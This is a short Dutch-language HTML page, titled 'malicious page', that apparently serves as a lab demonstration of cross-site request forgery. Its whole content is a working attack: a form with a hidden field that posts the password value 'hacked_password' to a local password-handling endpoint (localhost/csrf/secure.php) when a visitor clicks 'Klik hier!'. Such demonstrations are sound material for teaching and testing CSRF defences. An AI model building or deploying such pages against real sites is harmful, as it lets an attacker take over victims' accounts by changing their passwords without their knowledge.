<!DOCTYPE html>
<html>
<head>
    <title>Kwaadaardige Pagina</title>
</head>
<body>
    <h1>Deze pagina voert een CSRF-aanval uit!</h1>
    <form action="http://localhost/csrf/secure.php" method="POST">
        <input type="hidden" name="password" value="hacked_password">
        <button type="submit">Klik hier!</button>
    </form>
</body>
</html>
